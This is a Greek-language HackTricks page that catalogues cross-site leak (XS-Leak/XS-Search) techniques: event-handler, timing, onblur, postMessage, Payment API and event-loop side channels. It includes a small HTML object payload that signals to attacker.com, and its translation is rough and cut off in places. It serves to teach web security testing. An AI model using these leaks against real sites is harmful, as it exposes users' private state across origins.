# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο GitHub.

</details>

## Βασικές Πληροφορίες

Το XS-Search είναι μια μέθοδος που χρησιμοποιείται για την **εξαγωγή διασυνοριακών πληροφοριών** εκμεταλλευόμενος **ευπαθείς ευρυζωνικές ευπάθειες**.

Κύρια στοιχεία που συμμετέχουν σε αυτήν την επίθεση περιλαμβάνουν:

* **Ευάλωτη Ιστοσελίδα**: Η ιστοσελίδα-στόχος από την οποία προορίζεται να εξαχθούν πληροφορίες.
* **Ιστοσελίδα του Επιτιθέμενου**: Η κακόβουλη ιστοσελίδα που δημιουργεί ο επιτιθέμενος, την οποία επισκέπτεται ο θύμα, φιλοξενώντας την εκμετάλλευση.
* **Μέθοδος Ενσωμάτωσης**: Η τεχνική που χρησιμοποιείται για να ενσωματώσει την Ευάλωτη Ιστοσελίδα στην Ιστοσελίδα του Επιτιθέμενου (π.χ., window.open, iframe, fetch, ετικέτα HTML με href, κλπ.).
* **Τεχνική Διαρροής**: Τεχνικές που χρησιμοποιούνται για να διακρίνουν διαφορές στην κατάσταση της Ευάλωτης Ιστοσελίδας με βάση τις πληροφορίες που συλλέγονται μέσω της μεθόδου ενσωμάτωσης.
* **Καταστάσεις**: Οι δύο πιθανές συνθήκες της Ευάλωτης Ιστοσελίδας, τις οποίες ο επιτιθέμενος στοχεύει να διακρίνει.
* **Ανιχνεύσιμες Διαφορές**: Παρατηρήσιμες διακυμάνσεις στις οποίες βασίζεται ο επιτιθέμενος για να συμπεράνει την κατάσταση της Ευάλωτης Ιστοσελίδας.

### Ανιχνεύσιμες Διαφορές

Μπορούν να αναλυθούν αρκετά στοιχεία για να διακρίνουν τις καταστάσεις της Ευάλωτης Ιστοσελίδας:

* **Κωδικός Κατάστασης**: Διάκριση μεταξύ **διαφόρων κωδικών κατάστασης απάντησης HTTP** διασυνοριακά, όπως σφάλματα εξυπηρετητή, σφάλματα πελάτη ή σφάλματα πιστοποίησης.
* **Χρήση API**: Αναγνώριση **χρήσης των Web APIs** σε διάφορες σελίδες, αποκαλύπτοντας εάν μια διασυνοριακή σελίδα χρησιμοποιεί ένα συγκεκριμένο JavaScript Web API.
* **Ανακατευθύνσεις**: Ανίχνευση πλοήγησης σε διαφορετικές σελίδες, όχι μόνο HTTP ανακατευθύνσεις αλλά και αυτές που προκαλούνται από JavaScript ή HTML.
* **Περιεχόμενο Σελίδας**: Παρατήρηση **διακυμάνσεων στο σώμα της απάντησης HTTP** ή στους υπο-πόρους της σελίδας, όπως ο **αριθμός των ενσωματωμένων πλαισίων** ή οι διαφορές στο μέγεθος των εικόνων.
* **Κεφαλίδα HTTP**: Παρατήρηση της παρουσίας ή ίσως της τιμής μιας **συγκεκριμένης κεφαλίδας απάντησης HTTP**, συμπεριλαμβανομένων κεφαλίδων όπως X-Frame-Options, Content-Disposition και Cross-Origin-Resource-Policy.
* **Χρονοδιάγραμμα**: Παρατήρηση συνεχών χρονικών διαφορών μεταξύ των δύο καταστάσεων.

### Μέθοδοι Ενσωμάτωσης

* **Στοιχεία HTML**: Το HTML προσφέρει διάφορα στοιχεία για **ενσωμάτωση πόρων διασυνοριακά**, όπως φύλλα στυλ, εικόνες ή scripts, ώθοντας τον περιηγητή να ζητήσει ένα μη-HTML πόρο. Μια συλλογή πιθανών στοιχείων HTML για αυτόν τον σκοπό μπορεί να βρεθεί στο [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Πλαίσια**: Στοιχεία όπως **iframe**, **object** και **embed** μπορούν να ενσωματώσουν πόρους HTML απευθείας στη σελίδα του επιτιθέμενου. Αν η σελίδα **λείπει προστασία πλαισίων**, το JavaScript μπορεί να έχει πρόσβαση στο αντικείμενο παραθύρου του πλαισίου μέσω της ιδιότητας contentWindow.
* **Αναδυόμενα Παράθυρα**: Η μέθοδος **`window.open`** ανοίγει έναν πόρο σε ένα νέο παράθυρο ή καρτέλα, παρέχοντας ένα **χειριστή παραθύρου** για το JavaScript να αλληλεπιδρά με μεθόδους και ιδιότητες ακολουθώντας το SOP. Τα αναδυόμενα παράθυρα, συχνά χρησιμοποιούμενα στην ενιαία είσοδο, παρακάμπτουν τις περιορισμούς πλαισίων και cookies ενός στόχου πόρου. Ωστόσο, οι σύγχρονοι περιηγητές περιορίζουν τη δημιουργία αναδυόμενων παραθύρων σε συγκεκριμένες ενέργειες χρήστη.
* **Αιτήσεις JavaScript**: Το JavaScript επιτρέπει απευθείας αιτήσεις σε στόχους πόρους χρησιμοποιώντας **XMLHttpRequests** ή το **Fetch API**. Αυτές οι μέθοδοι προσφέρουν ακριβή έλεγχο επί της αιτήσεως, όπως η επιλογή να ακολουθήσουν HTTP ανακατευθύνσεις.

### Τεχνικές Διαρροής

* **Χειριστής Συμβάντος**: Μια κλασική τεχνική διαρροής στα XS-Leaks, όπου οι χειριστές συμβάντων όπως **onload** και **onerror** παρέχουν πληροφορίες για την επιτυχία ή την αποτυχία φόρτωσης πόρων.
* **Μηνύματα Σφαλμάτων**: Οι εξαιρέσεις JavaScript ή ειδικές σελίδες σφαλμάτων μπορούν να παρέχουν πληροφορίες διαρροής ε

## **Τεχνικές βασισμένες στο χρονισμό**

Ορισμένες από τις παρακάτω τεχνικές θα χρησιμοποιήσουν το χρόνο ως μέρος της διαδικασίας για την ανίχνευση διαφορών στις πιθανές καταστάσεις των ιστοσελίδων. Υπάρχουν διαφορετικοί τρόποι μέτρησης του χρόνου σε έναν περιηγητή ιστού.

**Ρολόγια**: Το API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) επιτρέπει στους προγραμματιστές να λαμβάνουν μετρήσεις υψηλής ανάλυσης του χρόνου.\
Υπάρχει ένας σημαντικός αριθμός από API που οι επιτιθέμενοι μπορούν να καταχραστούν για τη δημιουργία σιωπηρών ρολογιών: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Τεχνικές Χειριστή Συμβάντων

### Onload/Onerror

* **Μέθοδοι Ενσωμάτωσης**: Frames, Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Σύνοψη**: Εάν προσπαθείτε να φορτώσετε ένα πόρο και τα συμβάντα onerror/onload ενεργοποιούνται με επιτυχή/ανεπιτυχή φόρτωση του πόρου, είναι δυνατό να ανιχνευθεί ο κωδικός κατάστασης.
* **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Το παράδειγμα κώδικα προσπαθεί να **φορτώσει αντικείμενα scripts από το JS**, αλλά **άλλες ετικέτες** όπως αντικείμενα, φύλλα στυλ, εικόνες, ήχοι μπορούν επίσης να χρησιμοποιηθούν. Επιπλέον, είναι επίσης δυνατό να ενσωματώσετε τη **σήμανση απευθείας** και να δηλώσετε τα συμβάντα `onload` και `onerror` μέσα στη σήμανση (αντί να το ενσωματώσετε από το JS).

Υπάρχει επίσης μια έκδοση αυτής της επίθεσης χωρίς κώδικα:

```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```

### Χρονοποιημένη Φόρτωση

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω περιεχομένου σελίδας, κωδικού κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Σύνοψη:** Το [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για την εκτέλεση μιας αίτησης. Ωστόσο, μπορούν να χρησιμοποιηθούν και άλλοι χρονομετρητές, όπως το [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) που μπορεί να αναγνωρίσει εργασίες που εκτελούνται για περισσότερο από 50ms.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) ένα άλλο παράδειγμα στο:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Χρονοποιημένη Φόρτωση + Επιβολή Βαριάς Εργασίας

Αυτή η τεχνική είναι παρόμοια με την προηγούμενη, αλλά ο **επιτιθέμενος** θα επιβάλει επίσης κάποια ενέργεια που θα πάρει **σημαντικό χρόνο** όταν η **απάντηση είναι θετική ή αρνητική** και θα μετρήσει αυτόν τον χρόνο.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Χρονοποιημένη Αποφόρτωση/Πριν από την Αποφόρτωση

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω περιεχομένου σελίδας, κωδικού κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Σύνοψη:** Το [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για την εκτέλεση μιας αίτησης. Μπορούν να χρησιμοποιηθούν και άλλοι χρονομετρητές.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Ο χρόνος που απαιτείται για τη λήψη ενός πόρου μπορεί να μετρηθεί χρησιμοποιώντας τα γεγονότα [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) και [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). Το γεγονός **`beforeunload`** εκτελείται όταν ο περιηγητής είναι έτοιμος να μεταβεί σε μια νέα σελίδα, ενώ το γεγονός **`unload`** συμβαίνει όταν η μετάβαση πραγματοποιείται πραγματικά. Η διαφορά χρόνου μεταξύ αυτών των δύο γεγονότων μπορεί να υπολογιστεί για να προσδιοριστεί η **διάρκεια που ο περιηγητής ξόδεψε για τη λήψη του πόρου**.

### Χρονοποιημένη Φόρτωση Πλαισίου με Αμμοδοχείο + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω περιεχομένου σελίδας, κωδικού κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Σύνοψη:** Το [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για την εκτέλεση μιας αίτησης. Μπορούν να χρησιμοποιηθούν και άλλοι χρονομετρητές.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Έχει παρατηρηθεί ότι στην απουσία [Προστασίας Πλαισίων](https://xsleaks.dev/docs/defenses/opt-in/xfo/), ο χρόνος που απαιτείται για τη φόρτωση μιας σελίδας και των υπο-πόρων της μέσω του δικτύου μπορεί να μετρηθεί από έναν επιτιθέμενο. Αυτή η μέτρηση είναι συνήθως δυνατή επειδή το χειριστήριο `onload` ενός iframe ενεργοποιείται μόνο μετά την ολοκλήρωση της φόρτωσης των πόρων και της εκτέλεσης JavaScript. Για να παρακάμψει τη μεταβλητότητα που εισάγει η εκτέλεση script, ένας επιτιθέμενος μπορεί να χρησιμοποιήσει το χαρακτηριστικό [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) μέσα στο `<iframe>`. Η ενσωμάτωση αυτού του χαρακτηριστικού περιορίζει πολλαπλές λειτουργίες, κυρίως την εκτέλεση JavaScript, διευκολύνοντας έτσι μια μέτρηση που επηρεάζεται κυρίως από την απόδοση του δικτύου.

```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```

### #ID + σφάλμα + onload

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**:
* **Σύνοψη**: Εάν μπορείτε να προκαλέσετε σφάλμα στη σελίδα όταν προσπελαύνεται το σωστό περιεχόμενο και να τη φορτώσετε σωστά όταν προσπελαύνεται οποιοδήποτε περιεχόμενο, τότε μπορείτε να δημιουργήσετε έναν βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετράτε τον χρόνο.
* **Παράδειγμα Κώδικα**:

Υποθέστε ότι μπορείτε **να εισάγετε** τη **σελίδα** που περιέχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε **να κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**σημαία**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενοι ένα CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**συμβάν onload**_ θα **εκτελεστεί πάντα τουλάχιστον μία φορά**. Έπειτα, μπορείτε **να αλλάξετε** το **URL** του **iframe** αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στο URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Αν το πρώτο URL **φορτώθηκε με επιτυχία**, τότε, όταν **αλλάξετε** το **μέρος hash** του URL το συμβάν **onload δεν θα ενεργοποιηθεί** ξανά. Αλλά **αν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά τη **φόρτωση**, τότε, το συμβάν **onload θα ενεργοποιηθεί ξανά**.

Έτσι, μπορείτε **να διακρίνετε μεταξύ** μιας σελίδας που φορτώθηκε **σωστά** ή σελίδας που έχει ένα **σφάλμα** όταν προσπελαύνεται.

### Εκτέλεση Javascript

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**:
* **Σύνοψη**: Εάν η **σελίδα** επιστρέφει το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να **ελεγχθεί** από τον χρήστη. Ο χρήστης θα μπορούσε να ορίσει **έγκυρο κώδικα JS στην αρνητική περίπτωση**, και να **φορτώσει** κάθε προσπάθεια μέσα σε **`<script>`** ετικέτες, έτσι στις **αρνητικές** περιπτώσεις ο κώδικας των επιτιθέμενων **εκτελείται**, και στις **θετικές** περιπτώσεις **τίποτα** δεν θα εκτελεστεί.
* **Παράδειγμα Κώδικα**:

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης & Επικεφαλίδες
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Σύνοψη**: Το **Cross-Origin Read Blocking (CORB)** είναι μέτρο ασφαλείας που εμποδίζει τις ιστοσελίδες από το να φορτώνουν ορισμένους ευαίσθητους διασυνοριακούς πόρους για να προστατευτούν από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν την προστατευτική συμπεριφορά του. Όταν μια απάντηση υπόκειται σε **CORB** επιστρέφει ένα _**προστατευμένο από CORB**_ `Content-Type` με `nosniff` και έναν κωδικό κατάστασης `2xx`, το **CORB** αφαιρεί το σώμα και τις επικεφαλίδες της απάντησης. Οι επιτιθέμενοι παρατηρώντας αυτό μπορούν να συμπεράνουν τον συνδυασμό του **κωδικού κατάστασης** (που υποδηλώνει επιτυχία ή σφάλμα) και του `Content-Type` (που υποδηλώνει εάν προστατεύεται από το **CORB**), οδηγώντας σε πιθανή διαρροή πληροφοριών.
* **Παράδειγμα Κώδικα**:

Ελέγξτε τον σύνδεσμο με τις περισσότερες πληροφορίες για περισσότερες πληροφορίες σχετικά με την επίθεση.

### onblur

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Σύνοψη**: Διαρροή ευαίσθητων δεδομένων από το χαρακτηριστικό id ή name.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Είναι δυνατόν να **φορτώσετε μια σελίδα** μέσα σε ένα **iframe** και να χρησιμοποιήσετε το **`#id_value`** για να κάνετε τη σελίδα **εστιάσει στο στοιχείο** του iframe με το συγκεκριμένο id, έπειτα αν ένα σήμα **`onblur`** ενεργοποιηθεί, το στοιχείο ID υπάρχει.\
Μπορείτε να πραγματοποιήσετε την ίδια επίθεση με ετικέτες **`portal`**.

### Διανομή Μηνυμάτων postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Χρήση API
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Σύνοψη**: Συγκέντρωση ευαίσθητων πληροφοριών από ένα postMessage ή χρήση της παρουσίας των postMessages ως μαντρόχαρτο για να γνωρίζετε την κατάσταση του χρήστη στη σελίδα
* **Παράδειγμα Κώδικα**: `Οποιοδήποτε κώδικας που ακούει για όλα τα postMessages.`

Οι εφαρμογές χρησιμοποιούν συχνά τις [εκπομπές `postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) για να επικοινωνήσουν σε διαφορετικές προέλευσεις. Ωστόσο, αυτή η μέθοδος μπορεί ακούσια να αποκαλύψει **ευαίσθητες πληροφορίες** εάν η παράμετρος `targetOrigin` δεν καθορίζεται σωστά, επιτρέποντας σε οποιοδήποτε παράθυρο να λαμβάνει τα μηνύματα. Επιπλέον, η απλή λήψη ενός μηνύματος μπορεί να λειτουργήσει ως **μαντρόχαρτο**· για παράδειγμα, ορισμένα μηνύματα μπορεί να σταλούν μόνο σε χρήστες που έχουν συνδεθεί. Έτσι, η παρουσία ή η απουσία αυτών των μηνυμάτων μπορεί να αποκαλύψει πληροφορίες σχετικά με την κατάσταση ή την ταυτότητα του χρήστη, όπως εάν είναι ταυτοποιημένοι ή όχι.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)

### Πληρωμών API

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Χρήση API
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Σύνοψη**: Ανίχνευση Αιτήσεων Πληρωμής επειδή μόνο μία μπορεί να είναι ενεργή ταυτόχρονα.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτό το XS-Leak επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει όταν μια σελίδα διασταυρού προέρχεται από μια αίτηση πληρωμής**.

Επειδή **μόνο μία αίτηση πληρωμής μπορεί να είναι ενεργή** ταυτόχρονα, αν η ιστοσελίδα-στόχος χρησιμοποιεί το Payment Request API, οποιαδήποτε **προσπάθεια να χρησιμοποιήσει αυτό το API θα αποτύχει**, και θα προκαλέσει μια **εξαίρεση JavaScript**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας **περιοδικά να εμφανίσει το UI του Payment API**. Αν μια προσπάθεια προκαλέσει μια εξαίρεση, η ιστοσελίδα-στόχος το χρησιμοποιεί αυτή τη στιγμή. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Χρονομέτρηση του Κύκλου Γεγονότων <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Μέθοδοι Ενσωμάτωσης**:
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Σύνοψη:** Μέτρηση του χρόνου εκτέλεσης μιας ιστοσελίδας κατάχρησης του μονονηματικού JS κύκλου γεγονότων.
* **Παράδειγμα Κώδικα**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

Το JavaScript λειτουργεί με βάση το [μονονηματικό μοντέλο συγχρονισμού κύκλου γεγονότων](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), υποδηλώνοντας ότι **μπορεί να εκτελέσει μόνο μια εργασία τη φορά**. Αυτό το χαρακτηριστικό μπορεί να εκμεταλλευτεί για να μετρήσει **πόσο χρόνο χρειάζεται για να εκτελεστεί κώδικας από διαφορετική προέλευση**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στον κύκλο γεγονότων συνεχώς αποστέλλοντας συνεχώς γεγονότα με σταθερές ιδιότητες. Αυτά τα γεγονότα θα επεξεργαστούν όταν η ουρά γεγονότων είναι άδεια. Αν και άλλες προελεύσεις αποστέλλουν επίσης γεγονότα στην ίδια ουρά, ένας **επιτιθέμενος μπορεί να συμπεράνει το χρόνο που χρειάζονται αυτά τα εξωτερικά γεγονότα για να εκτελεστούν παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του κύκλου γεγονότων για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης κώδικα από διαφορετικές προελεύσεις, αποκαλύπτοντας ενδεχομένως ευαίσθητες πληροφορίες.

{% hint style="warning" %}
Σε μια χρονομέτρηση εκτέλεσης είναι δυνατόν να **εξαλειφθούν** **παράγοντες δικτύου** για να ληφθούν **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιεί η σελίδα πριν τη φόρτωσή της.
{% endhint %}

### Απασχολημένος Κύκλος Γεγονότων <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Μέθοδοι Ενσωμάτωσης**:
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω Περιεχομένου Σελίδας, Κωδικού Κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Σύνοψη:** Μια μέθοδος για τη μέτρηση του χρόνου εκτέλεσης μιας ιστοσελίδας περιλαμβάνει το εσκεμμένο μπλοκάρισμα του κύκλου γεγονότων ενός νήματος και στη συνέχεια το χρονομέτρηση **πόσο χρόνο χρειάζεται για να είναι διαθέσιμος ξανά ο κύκλος γεγονότων**. Εισάγοντας μια λειτουργία μπλοκαρίσματος (όπως μια μακρά υπολογιστική εργασία ή μια σύγχρονη κλήση API) στον κύκλο γεγονότων και παρακολουθώντας το χρόνο που χρειάζεται για την έναρξη της εκτέλεσης του επόμενου κώδικα, μπορεί κανείς να συμπεράνει τη διάρκεια των εργασιών που εκτελούνταν στον κύκλο γεγονότων κατά τη διάρκεια της περιόδου μπλοκαρίσματος. Αυτή η τεχνική εκμεταλλεύεται τη μονονηματική φύση του κύκλου γεγονότων του JavaScript, όπου οι εργασίες εκτελούνται σειριακά, και μπορεί να παρέχει εισαγωγές σχετικά με την απόδοση ή τη συμπεριφορά άλλων λειτουργιών που μοιράζονται το ίδιο νήμα.
* **Παράδειγμα Κώδικα**:

Ένα σημαντικό πλεονέκτημα της τεχνικής μέτρησης του χρόνου εκτέλεσης με το κλείδωμα του κύκλου γεγονότων είναι η δυνατότητά της να παρακάμψει τη **Μόνωση Ιστοσελίδας**. Η **Μόνωση Ιστοσελίδας** είναι μια λειτουργία ασφαλείας που διαχωρίζει διαφορετικές ιστοσελίδες σε ξεχωριστές διεργασίες, με στόχο να αποτρέψει τις κακόβουλες ιστοσελίδες από το άμεσο πρόσβαση σε ευαίσθητα δεδομένα από άλλες ιστοσελίδες. Ωστόσο, επηρεάζοντας τη χρονομέτρηση εκτέλεσης μιας άλλης προέλευσης μέσω του κοινόχρηστου κύκλου γεγονότων, ένας επιτιθέμενος μπορεί να εξάγει έμμεσα πληροφορίες σχετικά με τις δραστηριότητες αυτής της προέλευσης. Αυτή η μέθοδος δεν βασίζεται στην άμεση πρόσβαση στα δεδομένα της άλλης προέλευσης, αλλά παρατηρεί τις επιπτώσεις των δραστηριοτήτων αυτής της προέλευσης στον κοινό κύκλο γεγονότων, αποφεύγοντας έτσι τα προστατευτικά φράγματα που έχει θεσπίσει η \*\*Μόνωση Ιστοσελίδας

## Τεχνικές API Απόδοσης

